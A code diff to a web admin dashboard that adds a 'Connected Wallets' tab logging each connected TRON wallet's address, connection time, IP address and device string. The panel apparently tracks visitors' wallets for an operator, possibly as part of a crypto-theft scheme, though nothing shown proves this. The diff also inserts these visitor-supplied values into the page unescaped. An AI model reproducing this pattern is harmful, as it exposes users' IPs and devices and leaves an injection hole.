@@ -96,6 +96,9 @@
             <button id="tab-completed" onclick="switchTab('completed')" class="px-4 py-2 bg-gray-700/50 text-gray-400 text-sm rounded-lg font-medium">
                 Completed <span id="tab-completed-count" class="ml-1 text-xs opacity-70"></span>
             </button>
+            <button id="tab-connected" onclick="switchTab('connected-wallets')" class="px-4 py-2 bg-gray-700/50 text-gray-400 text-sm rounded-lg font-medium">
+                Connected <span id="tab-connected-count" class="ml-1 text-xs opacity-70"></span>
+            </button>
             <button id="tab-logs" onclick="switchTab('logs')" class="px-4 py-2 bg-gray-700/50 text-gray-400 text-sm rounded-lg font-medium">
                 Logs
             </button>
@@ -137,6 +140,23 @@
             </table>
         </div>
 
+        <!-- Connected Wallets Table -->
+        <div id="panel-connected-wallets" class="glass rounded-xl overflow-hidden hidden">
+            <table class="w-full">
+                <thead>
+                    <tr class="border-b border-gray-700/50">
+                        <th class="text-left text-xs text-gray-500 font-medium p-3">Wallet Address</th>
+                        <th class="text-left text-xs text-gray-500 font-medium p-3">Connected At</th>
+                        <th class="text-left text-xs text-gray-500 font-medium p-3">IP</th>
+                        <th class="text-left text-xs text-gray-500 font-medium p-3">Device</th>
+                    </tr>
+                </thead>
+                <tbody id="connected-tbody">
+                    <tr><td colspan="4" class="text-center text-gray-600 p-8 text-sm">No connected wallets yet</td></tr>
+                </tbody>
+            </table>
+        </div>
+
         <!-- Logs Panel -->
         <div id="panel-logs" class="glass rounded-xl p-4 hidden">
             <div id="logs-container" class="font-mono text-xs text-gray-400 space-y-1 max-h-96 overflow-y-auto">
@@ -158,16 +178,19 @@
         function switchTab(tab) {
             document.getElementById("panel-pending").classList.add("hidden");
             document.getElementById("panel-completed").classList.add("hidden");
+            document.getElementById("panel-connected-wallets").classList.add("hidden");
             document.getElementById("panel-logs").classList.add("hidden");
             document.getElementById(`panel-${tab}`).classList.remove("hidden");
 
             document.getElementById("tab-pending").className = "px-4 py-2 bg-gray-700/50 text-gray-400 text-sm rounded-lg font-medium";
             document.getElementById("tab-completed").className = "px-4 py-2 bg-gray-700/50 text-gray-400 text-sm rounded-lg font-medium";
+            document.getElementById("tab-connected").className = "px-4 py-2 bg-gray-700/50 text-gray-400 text-sm rounded-lg font-medium";
             document.getElementById("tab-logs").className = "px-4 py-2 bg-gray-700/50 text-gray-400 text-sm rounded-lg font-medium";
 
-            const colors = { pending: "yellow", completed: "green", logs: "blue" };
+            const colors = { pending: "yellow", completed: "green", "connected-wallets": "purple", logs: "blue" };
             const c = colors[tab];
-            document.getElementById(`tab-${tab}`).className = `px-4 py-2 bg-${c}-500/20 text-${c}-400 text-sm rounded-lg font-medium`;
+            const tabId = tab === "connected-wallets" ? "connected" : tab;
+            document.getElementById(`tab-${tabId}`).className = `px-4 py-2 bg-${c}-500/20 text-${c}-400 text-sm rounded-lg font-medium`;
         }
 
         function shortenAddr(addr) {
@@ -266,6 +289,24 @@
             // Tab counts
             document.getElementById("tab-pending-count").textContent = `(${data.pendingCount})`;
             document.getElementById("tab-completed-count").textContent = `(${data.completedCount})`;
+            document.getElementById("tab-connected-count").textContent = `(${data.connectedCount || 0})`;
+
+            // Connected wallets table
+            const connectedTbody = document.getElementById("connected-tbody");
+            if (!data.connected || data.connected.length === 0) {
+                connectedTbody.innerHTML = `<tr><td colspan="4" class="text-center text-gray-600 p-8 text-sm">No connected wallets yet</td></tr>`;
+            } else {
+                connectedTbody.innerHTML = data.connected.slice().reverse().map(w => `
+                    <tr class="border-b border-gray-800/50 hover:bg-white/5">
+                        <td class="p-3">
+                            <a href="${tronscanLink(w.address)}" target="_blank" class="text-purple-400 hover:underline font-mono text-xs">${w.address}</a>
+                        </td>
+                        <td class="p-3 text-gray-400 text-xs">${w.connectedAt || "-"}</td>
+                        <td class="p-3 text-gray-400 text-xs">${w.ip || "-"}</td>
+                        <td class="p-3 text-gray-500 text-xs" style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${w.userAgent || "-"}</td>
+                    </tr>
+                `).join("");
+            }
 
             // Pending table
             const pendingTbody = document.getElementById("pending-tbody");
